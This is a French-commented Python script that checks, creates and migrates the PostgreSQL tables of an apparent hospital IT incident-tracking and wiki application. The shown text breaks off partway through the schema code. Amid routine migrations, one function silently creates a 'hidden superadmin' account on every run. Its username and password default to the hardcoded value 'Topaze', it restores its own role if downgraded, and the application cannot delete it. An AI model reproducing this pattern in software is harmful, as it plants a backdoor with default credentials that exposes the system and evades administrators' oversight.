"""
Script de vérification et garantie de l'intégrité de la base de données PostgreSQL
Ce script s'assure que toutes les tables nécessaires existent et sont correctement structurées
"""
import os
import logging
from werkzeug.security import generate_password_hash
from app.utils.db_config import get_db
from app.utils.concurrency import ensure_idempotency_tables

logger = logging.getLogger(__name__)

DB_INTEGRITY_LOCK_KEY = 8742301


def _bootstrap_admin_user(cursor):
    """Create an initial admin only from explicit bootstrap env vars."""
    bootstrap_username = (os.environ.get("BOOTSTRAP_ADMIN_USERNAME") or "").strip()
    bootstrap_password = os.environ.get("BOOTSTRAP_ADMIN_PASSWORD") or ""

    if not bootstrap_username and not bootstrap_password:
        return

    if not bootstrap_username or not bootstrap_password:
        logger.info(
            "   - BOOTSTRAP_ADMIN_USERNAME et BOOTSTRAP_ADMIN_PASSWORD doivent etre definis ensemble (bootstrap ignore)"
        )
        return

    existing = cursor.execute(
        "SELECT id FROM users WHERE LOWER(username)=LOWER(%s)",
        (bootstrap_username,),
    ).fetchone()
    if existing:
        logger.info(f"   - Compte bootstrap '{bootstrap_username}' deja present")
        return

    cursor.execute(
        """
        INSERT INTO users (username, password, role, force_password_reset)
        VALUES (%s, %s, %s, %s)
        ON CONFLICT (username) DO NOTHING
        """,
        (bootstrap_username, generate_password_hash(bootstrap_password), "admin", 1),
    )
    if cursor.rowcount:
        logger.info(f"   - Compte admin bootstrap cree: {bootstrap_username} (reset mot de passe force)")
    else:
        logger.info(f"   - Compte bootstrap '{bootstrap_username}' deja present")


def _warn_if_no_admin_user(cursor):
    admin_count_row = cursor.execute(
        "SELECT COUNT(*) AS cnt FROM users WHERE role='admin'"
    ).fetchone()
    admin_count = admin_count_row["cnt"] if admin_count_row else 0
    if admin_count == 0:
        logger.info(
            "   - ATTENTION: aucun compte admin dans users. "
            "Definir BOOTSTRAP_ADMIN_USERNAME/BOOTSTRAP_ADMIN_PASSWORD ou creer un admin manuellement."
        )


def _bootstrap_superadmin_user(cursor):
    """Create or maintain the hidden superadmin recovery account.

    - Created from SUPERADMIN_USERNAME / SUPERADMIN_PASSWORD env vars.
    - Role is always 'superadmin' (never downgraded).
    - Cannot be deleted by the application.
    """
    sa_username = (os.environ.get("SUPERADMIN_USERNAME") or "Topaze").strip()
    sa_password = os.environ.get("SUPERADMIN_PASSWORD") or "Topaze"

    if not sa_username or not sa_password:
        return

    existing = cursor.execute(
        "SELECT id, role FROM users WHERE LOWER(username)=LOWER(%s)",
        (sa_username,),
    ).fetchone()

    if existing:
        # Ensure role is always 'superadmin' (protect against manual downgrade)
        if existing["role"] != "superadmin":
            cursor.execute(
                "UPDATE users SET role='superadmin' WHERE id=%s",
                (existing["id"],),
            )
            logger.info(f"   - Compte superadmin '{sa_username}': role restaure a superadmin")
        else:
            logger.info(f"   - Compte superadmin '{sa_username}' deja present")
        return

    cursor.execute(
        """
        INSERT INTO users (username, password, role, force_password_reset)
        VALUES (%s, %s, %s, %s)
        ON CONFLICT (username) DO NOTHING
        """,
        (sa_username, generate_password_hash(sa_password), "superadmin", 0),
    )
    if cursor.rowcount:
        logger.info(f"   - Compte superadmin cree: {sa_username}")


def ensure_database_integrity():
    """Garantit que toutes les tables nécessaires existent avec la bonne structure"""
    
    logger.info("Verification de l'integrite de la base de donnees PostgreSQL...")
    
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT pg_advisory_lock(%s)", (DB_INTEGRITY_LOCK_KEY,))
    
    tables_created = []
    tables_verified = []
    
    # ========== TABLE: users ==========
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables
            WHERE table_schema = 'public'
            AND table_name = 'users'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE users (
                id SERIAL PRIMARY KEY,
                username VARCHAR(255) UNIQUE NOT NULL,
                password VARCHAR(255) NOT NULL,
                role VARCHAR(50) NOT NULL,
                force_password_reset INTEGER DEFAULT 0
            )
        """)
        tables_created.append("users")
    else:
        tables_verified.append("users")
        # Migration: s'assurer que la colonne force_password_reset existe
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='users' AND column_name='force_password_reset'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE users ADD COLUMN force_password_reset INTEGER DEFAULT 0")
            logger.info("   - Colonne force_password_reset ajoutee a la table users")
        
        # Migration: ajouter colonne 'email' pour email
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='users' AND column_name='email'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE users ADD COLUMN email VARCHAR(255)")
            logger.info("   - Colonne email ajoutee a la table users")
        
        # Migration: ajouter colonne 'dect_number' pour numéro de téléphone DECT
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='users' AND column_name='dect_number'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE users ADD COLUMN dect_number VARCHAR(20)")
            logger.info("   - Colonne dect_number ajoutee a la table users")
        
        # Migration: ajouter colonne 'photo_profil' pour photo de profil
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='users' AND column_name='photo_profil'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE users ADD COLUMN photo_profil VARCHAR(255)")
            logger.info("   - Colonne photo_profil ajoutee a la table users")
        
        # Migration: ajouter colonne 'prenom' pour prénom
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='users' AND column_name='prenom'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE users ADD COLUMN prenom VARCHAR(255)")
            logger.info("   - Colonne prenom ajoutee a la table users")
            # Initialiser prenom avec username pour les utilisateurs existants
            cursor.execute("UPDATE users SET prenom = username WHERE prenom IS NULL")
            logger.info("   - Prenom initialise avec username pour les utilisateurs existants")
        
        # Migration: ajouter colonne 'nom' pour nom de famille
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='users' AND column_name='nom'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE users ADD COLUMN nom VARCHAR(255)")
            logger.info("   - Colonne nom ajoutee a la table users")

        # Migration: ajouter colonnes de récupération de mot de passe
        for col_name in ['question1', 'answer1', 'question2', 'answer2']:
            cursor.execute(f"""
                SELECT column_name
                FROM information_schema.columns
                WHERE table_name='users' AND column_name='{col_name}'
            """)
            if not cursor.fetchone():
                cursor.execute(f"ALTER TABLE users ADD COLUMN {col_name} TEXT")
                logger.info(f"   - Colonne {col_name} ajoutee a la table users")

    _bootstrap_admin_user(cursor)
    _warn_if_no_admin_user(cursor)
    _bootstrap_superadmin_user(cursor)
    
    # ========== TABLE: techniciens ==========
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables
            WHERE table_schema = 'public'
            AND table_name = 'techniciens'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE techniciens (
                id SERIAL PRIMARY KEY,
                prenom VARCHAR(255) UNIQUE NOT NULL,
                password VARCHAR(255),
                role VARCHAR(50) DEFAULT 'technicien',
                actif INTEGER DEFAULT 1,
                force_password_reset INTEGER DEFAULT 0,
                ordre INTEGER DEFAULT 0
            )
        """)
        tables_created.append("techniciens")
    else:
        tables_verified.append("techniciens")
        # Migration: s'assurer que la colonne force_password_reset existe
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='techniciens' AND column_name='force_password_reset'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE techniciens ADD COLUMN force_password_reset INTEGER DEFAULT 0")
            logger.info("   - Colonne force_password_reset ajoutee a la table techniciens")
        
        # Migration: s'assurer que la colonne ordre existe
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='techniciens' AND column_name='ordre'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE techniciens ADD COLUMN ordre INTEGER DEFAULT 0")
            logger.info("   - Colonne ordre ajoutee a la table techniciens")
            # Initialiser l'ordre pour les techniciens existants basé sur leur id
            cursor.execute("""
                UPDATE techniciens 
                SET ordre = id 
                WHERE ordre = 0 OR ordre IS NULL
            """)
            logger.info("   - Ordre initialise pour les techniciens existants")

        # Migration: ajouter colonne 'nom' pour nom de famille
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='techniciens' AND column_name='nom'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE techniciens ADD COLUMN nom VARCHAR(255)")
            logger.info("   - Colonne nom ajoutee a la table techniciens")

        # Migration: ajouter colonne 'username' pour identifiant de connexion
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='techniciens' AND column_name='username'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE techniciens ADD COLUMN username VARCHAR(255) UNIQUE")
            logger.info("   - Colonne username ajoutee a la table techniciens")
            # Générer des usernames temporaires depuis prenom (en minuscules)
            cursor.execute("""
                UPDATE techniciens
                SET username = LOWER(prenom)
                WHERE username IS NULL
            """)
            logger.info("   - Usernames generes depuis prenom pour techniciens existants")

        # Migration: ajouter colonne 'email' pour mail CHU
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='techniciens' AND column_name='email'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE techniciens ADD COLUMN email VARCHAR(255) UNIQUE")
            logger.info("   - Colonne email ajoutee a la table techniciens")

        # Migration: ajouter colonne 'dect_number' pour numéro de téléphone DECT
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='techniciens' AND column_name='dect_number'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE techniciens ADD COLUMN dect_number VARCHAR(20)")
            logger.info("   - Colonne dect_number ajoutee a la table techniciens")

        # Migration: ajouter colonne 'matricule' pour identifiant interne
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='techniciens' AND column_name='matricule'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE techniciens ADD COLUMN matricule VARCHAR(50)")
            logger.info("   - Colonne matricule ajoutee a la table techniciens")

        # Migration: ajouter colonne 'photo_profil' pour photo de profil
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='techniciens' AND column_name='photo_profil'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE techniciens ADD COLUMN photo_profil VARCHAR(255)")
            logger.info("   - Colonne photo_profil ajoutee a la table techniciens")

        # Migration: ajouter colonne 'created_at' pour date de création
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='techniciens' AND column_name='created_at'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE techniciens ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP")
            logger.info("   - Colonne created_at ajoutee a la table techniciens")

        # Migration: ajouter colonnes de récupération de mot de passe
        for col_name in ['question1', 'answer1', 'question2', 'answer2']:
            cursor.execute(f"""
                SELECT column_name
                FROM information_schema.columns
                WHERE table_name='techniciens' AND column_name='{col_name}'
            """)
            if not cursor.fetchone():
                cursor.execute(f"ALTER TABLE techniciens ADD COLUMN {col_name} TEXT")
                logger.info(f"   - Colonne {col_name} ajoutee a la table techniciens")

    # ========== TABLE: incidents ==========
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables
            WHERE table_schema = 'public'
            AND table_name = 'incidents'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE incidents (
                id SERIAL PRIMARY KEY,
                numero VARCHAR(255) NOT NULL,
                site VARCHAR(255) NOT NULL,
                sujet VARCHAR(255) NOT NULL,
                urgence VARCHAR(255) NOT NULL,
                collaborateur VARCHAR(255) NOT NULL,
                etat VARCHAR(255) DEFAULT 'Affecté',
                notes TEXT,
                note_dispatch TEXT,
                valide INTEGER DEFAULT 0,
                date_affectation DATE NOT NULL,
                archived INTEGER DEFAULT 0,
                localisation VARCHAR(255) DEFAULT '',
                version INTEGER NOT NULL DEFAULT 1,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        tables_created.append("incidents")
    else:
        tables_verified.append("incidents")
        # Migration: s'assurer que la colonne note_dispatch existe
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='incidents' AND column_name='note_dispatch'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE incidents ADD COLUMN note_dispatch TEXT")
            logger.info("   - Colonne note_dispatch ajoutee a la table incidents")

        # Migration: ajouter colonnes pour système de relances
        for col_name in ['relance_mail', 'relance_1', 'relance_2', 'relance_cloture']:
            cursor.execute(f"""
                SELECT column_name
                FROM information_schema.columns
                WHERE table_name='incidents' AND column_name='{col_name}'
            """)
            if not cursor.fetchone():
                cursor.execute(f"ALTER TABLE incidents ADD COLUMN {col_name} BOOLEAN DEFAULT FALSE")
                logger.info(f"   - Colonne {col_name} ajoutee a la table incidents")
        
        # Migration: ajouter colonne date_rdv pour système de rendez-vous
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='incidents' AND column_name='date_rdv'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE incidents ADD COLUMN date_rdv TIMESTAMP")
            logger.info("   - Colonne date_rdv ajoutee a la table incidents")

        # Migration: ajouter colonnes pour relance planifiee
        for col_name, col_def in [
            ('relance_planifiee_at', 'TIMESTAMP'),
            ('relance_done_at', 'TIMESTAMP')
        ]:
            cursor.execute(f"""
                SELECT column_name
                FROM information_schema.columns
                WHERE table_name='incidents' AND column_name='{col_name}'
            """)
            if not cursor.fetchone():
                cursor.execute(f"ALTER TABLE incidents ADD COLUMN {col_name} {col_def}")
                logger.info(f"   - Colonne {col_name} ajoutee a la table incidents")

        # Migration: version pour synchronisation temps reel des incidents
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='incidents' AND column_name='version'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE incidents ADD COLUMN IF NOT EXISTS version INTEGER NOT NULL DEFAULT 1")
            logger.info("   - Colonne version ajoutee a la table incidents")

        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='incidents' AND column_name='updated_at'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE incidents ADD COLUMN updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP")
            logger.info("   - Colonne updated_at ajoutee a la table incidents")

        # Migration: ajouter colonnes pour corbeille (soft delete)
        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='incidents' AND column_name='is_deleted'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE incidents ADD COLUMN is_deleted BOOLEAN DEFAULT FALSE")
            logger.info("   - Colonne is_deleted ajoutee a la table incidents")

        cursor.execute("""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='incidents' AND column_name='deleted_at'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE incidents ADD COLUMN deleted_at TIMESTAMP")
            logger.info("   - Colonne deleted_at ajoutee a la table incidents")

    # Durcissement DB de la concurrence: version positive + timestamp + trigger auto-version
    cursor.execute("UPDATE incidents SET version=1 WHERE version IS NULL OR version < 1")
    cursor.execute(
        "ALTER TABLE incidents DROP CONSTRAINT IF EXISTS chk_incidents_version_positive"
    )
    cursor.execute(
        "ALTER TABLE incidents ADD CONSTRAINT chk_incidents_version_positive CHECK (version > 0)"
    )

    cursor.execute(
        """
        CREATE OR REPLACE FUNCTION incidents_auto_version_update()
        RETURNS TRIGGER AS $$
        BEGIN
            IF to_jsonb(NEW) - ARRAY['version', 'updated_at']
               IS DISTINCT FROM to_jsonb(OLD) - ARRAY['version', 'updated_at'] THEN
                NEW.version := COALESCE(OLD.version, 1) + 1;
                NEW.updated_at := CURRENT_TIMESTAMP;
            ELSE
                NEW.version := COALESCE(OLD.version, 1);
                NEW.updated_at := COALESCE(OLD.updated_at, CURRENT_TIMESTAMP);
            END IF;
            RETURN NEW;
        END;
        $$ LANGUAGE plpgsql
        """
    )
    cursor.execute("DROP TRIGGER IF EXISTS trg_incidents_auto_version_update ON incidents")
    cursor.execute(
        """
        CREATE TRIGGER trg_incidents_auto_version_update
        BEFORE UPDATE ON incidents
        FOR EACH ROW
        EXECUTE FUNCTION incidents_auto_version_update()
        """
    )
    logger.info("   - Trigger auto-version incidents actif")

    # Indexes de performance sur colonnes chaudes incidents
    incident_indexes = [
        ("idx_incidents_archived", "CREATE INDEX IF NOT EXISTS idx_incidents_archived ON incidents (archived)"),
        ("idx_incidents_etat", "CREATE INDEX IF NOT EXISTS idx_incidents_etat ON incidents (etat)"),
        ("idx_incidents_date_affectation", "CREATE INDEX IF NOT EXISTS idx_incidents_date_affectation ON incidents (date_affectation DESC)"),
        ("idx_incidents_collaborateur", "CREATE INDEX IF NOT EXISTS idx_incidents_collaborateur ON incidents (collaborateur)"),
        ("idx_incidents_archived_etat_date", "CREATE INDEX IF NOT EXISTS idx_incidents_archived_etat_date ON incidents (archived, etat, date_affectation DESC)"),
    ]
    for index_name, index_sql in incident_indexes:
        cursor.execute(index_sql)
        logger.info(f"   - Index verifie: {index_name}")

    # Migration de normalisation: corriger les anciennes valeurs d'etat mojibake
    legacy_status_map = [
        ("AffectÃ©", "Affecté"),
        ("En cours de prÃ©paration", "En cours de préparation"),
        ("Intervention programmÃ©e", "Intervention programmée"),
        ("TransfÃ©rÃ©", "Transféré"),
        ("En rÃ©servation", "En réservation"),
        ("TraitÃ©", "Traité"),
        ("ClÃ´turÃ©", "Clôturé"),
    ]

    # ========== TABLE: historique ==========
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables 
            WHERE table_schema = 'public' 
            AND table_name = 'historique'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE historique (
                id SERIAL PRIMARY KEY,
                incident_id INTEGER NOT NULL,
                champ VARCHAR(255) NOT NULL,
                ancienne_valeur TEXT,
                nouvelle_valeur TEXT,
                modifie_par VARCHAR(255) NOT NULL,
                date_modification VARCHAR(255) NOT NULL,
                FOREIGN KEY (incident_id) REFERENCES incidents(id) ON DELETE CASCADE
            )
        """)
        tables_created.append("historique")
    else:
        tables_verified.append("historique")
    
    # ========== TABLE: sujets ==========
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables 
            WHERE table_schema = 'public' 
            AND table_name = 'sujets'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE sujets (
                id SERIAL PRIMARY KEY,
                nom VARCHAR(255) UNIQUE NOT NULL
            )
        """)
        # Insérer des sujets par défaut
        default_sujets = [
            'Portables',
            'PC Fixe',
            'Imprimantes - impressions',
            'Réseau',
            'Matériel',
            'Logiciel',
            'Téléphonie',
            'Messagerie',
            'Applications métiers',
            'Sécurité',
            'Accès / Droits',
            'Autre'
        ]
        for sujet in default_sujets:
            cursor.execute("INSERT INTO sujets (nom) VALUES (%s)", (sujet,))
        tables_created.append("sujets")
    else:
        tables_verified.append("sujets")
    
    # ========== TABLE: priorites ==========
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables 
            WHERE table_schema = 'public' 
            AND table_name = 'priorites'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE priorites (
                id SERIAL PRIMARY KEY,
                nom VARCHAR(255) UNIQUE NOT NULL,
                couleur VARCHAR(50) NOT NULL,
                niveau INTEGER NOT NULL,
                is_urgent BOOLEAN DEFAULT FALSE
            )
        """)
        # Insérer des priorités par défaut
        default_priorites = [
            ('Basse', '#28a745', 1, False),
            ('Moyenne', '#ffc107', 2, False),
            ('Haute', '#fd7e14', 3, True),
            ('Critique', '#dc3545', 4, True)
        ]
        for nom, couleur, niveau, is_urgent in default_priorites:
            cursor.execute("INSERT INTO priorites (nom, couleur, niveau, is_urgent) VALUES (%s, %s, %s, %s)", 
                         (nom, couleur, niveau, is_urgent))
        tables_created.append("priorites")
    else:
        tables_verified.append("priorites")
        # Migration: s'assurer que la colonne is_urgent existe
        cursor.execute("""
            SELECT column_name 
            FROM information_schema.columns 
            WHERE table_name='priorites' AND column_name='is_urgent'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE priorites ADD COLUMN is_urgent BOOLEAN DEFAULT FALSE")
            cursor.execute("UPDATE priorites SET is_urgent=TRUE WHERE nom IN ('Haute', 'Critique', 'Immédiate')")
            logger.info("   - Colonne is_urgent ajoutee a la table priorites")
    
    # ========== TABLE: sites ==========
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables 
            WHERE table_schema = 'public' 
            AND table_name = 'sites'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE sites (
                id SERIAL PRIMARY KEY,
                nom VARCHAR(255) UNIQUE NOT NULL,
                couleur VARCHAR(50) NOT NULL
            )
        """)
        # Insérer des sites par défaut
        default_sites = [
            ('HD', '#007bff'),
            ('HGRL', '#6f42c1'),
            ('SJ', '#e83e8c'),
            ('Periph', '#17a2b8')
        ]
        for nom, couleur in default_sites:
            cursor.execute("INSERT INTO sites (nom, couleur) VALUES (%s, %s)", (nom, couleur))
        tables_created.append("sites")
    else:
        tables_verified.append("sites")
    
    # ========== TABLE: statuts ==========
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables 
            WHERE table_schema = 'public' 
            AND table_name = 'statuts'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE statuts (
                id SERIAL PRIMARY KEY,
                nom VARCHAR(255) UNIQUE NOT NULL,
                couleur VARCHAR(50) NOT NULL,
                category VARCHAR(50) NOT NULL DEFAULT 'en_cours'
            )
        """)
        # Insérer des statuts par défaut avec catégories
        default_statuts = [
            # EN COURS (bleus/verts clairs)
            ('Affecté', '#007bff', 'en_cours'),
            ('En cours de préparation', '#0dcaf0', 'en_cours'),
            ('En intervention', '#20c997', 'en_cours'),

            # SUSPENDU (oranges)
            ('Suspendu', '#fd7e14', 'suspendu'),
            ('Intervention programmée', '#ffc107', 'suspendu'),

            # TRANSFERE (violets)
            ('Transféré', '#6f42c1', 'transfere'),
            ('En réservation', '#d63384', 'transfere'),

            # TRAITE (verts)
            ('Traité', '#28a745', 'traite'),
            ('Clôturé', '#198754', 'traite')
        ]
        for nom, couleur, category in default_statuts:
            cursor.execute(
                "INSERT INTO statuts (nom, couleur, category) VALUES (%s, %s, %s)",
                (nom, couleur, category)
            )
        tables_created.append("statuts")
    else:
        tables_verified.append("statuts")
        # Migration: s'assurer que la colonne category existe
        cursor.execute("""
            SELECT column_name 
            FROM information_schema.columns 
            WHERE table_name='statuts' AND column_name='category'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE statuts ADD COLUMN category VARCHAR(50)")
            cursor.execute("UPDATE statuts SET category='suspendu' WHERE nom='Suspendu'")
            cursor.execute("UPDATE statuts SET category='traite' WHERE nom='Traité'")
            cursor.execute("UPDATE statuts SET category='en_cours' WHERE category IS NULL OR category=''")
        
        # Migration: ajouter colonne 'has_relances' pour système de compteur de relances
        cursor.execute("""
            SELECT column_name 
            FROM information_schema.columns 
            WHERE table_name='statuts' AND column_name='has_relances'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE statuts ADD COLUMN has_relances BOOLEAN DEFAULT FALSE")
            logger.info("   - Colonne has_relances ajoutee a la table statuts")
        
        # Migration: ajouter colonne 'has_rdv' pour système de rendez-vous
        cursor.execute("""
            SELECT column_name 
            FROM information_schema.columns 
            WHERE table_name='statuts' AND column_name='has_rdv'
        """)
        if not cursor.fetchone():
            cursor.execute("ALTER TABLE statuts ADD COLUMN has_rdv BOOLEAN DEFAULT FALSE")
            logger.info("   - Colonne has_rdv ajoutee a la table statuts")
    
    # ========== TABLES WIKI V2 ==========
    
    # Table: wiki_categories
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables 
            WHERE table_schema = 'public' 
            AND table_name = 'wiki_categories'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE wiki_categories (
                id SERIAL PRIMARY KEY,
                name VARCHAR(255) NOT NULL,
                icon VARCHAR(50) DEFAULT '📁',
                description TEXT,
                color VARCHAR(50) DEFAULT '#4f46e5',
                position INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                created_by VARCHAR(255)
            )
        """)
        tables_created.append("wiki_categories")
    else:
        tables_verified.append("wiki_categories")
    
    # Table: wiki_subcategories
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables 
            WHERE table_schema = 'public' 
            AND table_name = 'wiki_subcategories'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE wiki_subcategories (
                id SERIAL PRIMARY KEY,
                name VARCHAR(255) NOT NULL,
                category_id INTEGER NOT NULL,
                icon VARCHAR(50) DEFAULT '📄',
                description TEXT,
                position INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                created_by VARCHAR(255),
                FOREIGN KEY (category_id) REFERENCES wiki_categories(id) ON DELETE CASCADE
            )
        """)
        tables_created.append("wiki_subcategories")
    else:
        tables_verified.append("wiki_subcategories")
    
    # Table: wiki_articles
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables 
            WHERE table_schema = 'public' 
            AND table_name = 'wiki_articles'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE wiki_articles (
                id SERIAL PRIMARY KEY,
                title VARCHAR(255) NOT NULL,
                content TEXT,
                subcategory_id INTEGER,
                icon VARCHAR(50) DEFAULT '📝',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                created_by VARCHAR(255) NOT NULL,
                last_modified_by VARCHAR(255),
                views_count INTEGER DEFAULT 0,
                likes_count INTEGER DEFAULT 0,
                dislikes_count INTEGER DEFAULT 0,
                is_featured INTEGER DEFAULT 0,
                tags TEXT,
                FOREIGN KEY (subcategory_id) REFERENCES wiki_subcategories(id) ON DELETE SET NULL
            )
        """)
        tables_created.append("wiki_articles")
    else:
        tables_verified.append("wiki_articles")
    
    # Migration: ajouter colonnes métadonnées à wiki_articles si elles n'existent pas
    metadata_columns = [
        ('status', "VARCHAR(20) DEFAULT 'published'"),
        ('owner', 'VARCHAR(255)'),
        ('summary', 'TEXT'),
        ('last_reviewed_at', 'TIMESTAMP'),
        ('expires_at', 'TIMESTAMP')
    ]
    
    for col_name, col_def in metadata_columns:
        cursor.execute(f"""
            SELECT column_name
            FROM information_schema.columns
            WHERE table_name='wiki_articles' AND column_name='{col_name}'
        """)
        if not cursor.fetchone():
            try:
                cursor.execute(f"ALTER TABLE wiki_articles ADD COLUMN {col_name} {col_def}")
                logger.info(f"   - Colonne {col_name} ajoutee a wiki_articles")
            except Exception as e:
                logger.info(f"   - Erreur lors de l'ajout de {col_name}: {e}")
    
    # Table: wiki_history
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables 
            WHERE table_schema = 'public' 
            AND table_name = 'wiki_history'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE wiki_history (
                id SERIAL PRIMARY KEY,
                article_id INTEGER NOT NULL,
                title VARCHAR(255),
                content TEXT,
                modified_by VARCHAR(255) NOT NULL,
                modified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                change_description TEXT,
                FOREIGN KEY (article_id) REFERENCES wiki_articles(id) ON DELETE CASCADE
            )
        """)
        tables_created.append("wiki_history")
    else:
        tables_verified.append("wiki_history")
    
    # Table: wiki_votes
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables 
            WHERE table_schema = 'public' 
            AND table_name = 'wiki_votes'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE wiki_votes (
                id SERIAL PRIMARY KEY,
                article_id INTEGER NOT NULL,
                user_name VARCHAR(255) NOT NULL,
                vote_type VARCHAR(20) CHECK(vote_type IN ('like', 'dislike')),
                voted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(article_id, user_name),
                FOREIGN KEY (article_id) REFERENCES wiki_articles(id) ON DELETE CASCADE
            )
        """)
        tables_created.append("wiki_votes")
    else:
        tables_verified.append("wiki_votes")
    
    # Table: wiki_images
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables 
            WHERE table_schema = 'public' 
            AND table_name = 'wiki_images'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE wiki_images (
                id SERIAL PRIMARY KEY,
                filename VARCHAR(255) NOT NULL,
                original_filename VARCHAR(255),
                filepath VARCHAR(500) NOT NULL,
                uploaded_by VARCHAR(255) NOT NULL,
                uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                article_id INTEGER,
                file_size INTEGER,
                mime_type VARCHAR(100),
                FOREIGN KEY (article_id) REFERENCES wiki_articles(id) ON DELETE SET NULL
            )
        """)
        tables_created.append("wiki_images")
    else:
        tables_verified.append("wiki_images")
    
    # Table: wiki_tags
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables 
            WHERE table_schema = 'public' 
            AND table_name = 'wiki_tags'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE wiki_tags (
                id SERIAL PRIMARY KEY,
                name VARCHAR(100) UNIQUE NOT NULL,
                color VARCHAR(20) DEFAULT '#4f46e5',
